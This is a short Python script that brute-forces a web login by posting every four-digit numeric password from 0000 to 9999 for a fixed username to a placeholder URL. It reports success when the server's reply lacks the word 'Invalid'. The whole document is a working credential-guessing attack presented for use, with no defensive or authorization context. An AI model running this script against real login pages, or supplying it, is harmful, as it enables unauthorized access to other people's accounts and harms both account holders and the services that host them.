# Facilitates sending and receiving HTTP requests from web apps.
import requests 

# Send post requests to target URL.
url = "http://someurl.com"

username = "someusername"

# Generating 4-digit numeric passwords (0000 - 9999)
password_list = [str(i).zfill(4) for i in range (10000)]

# Iterates through password list, sending diff. usernames and password combos to server.
def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
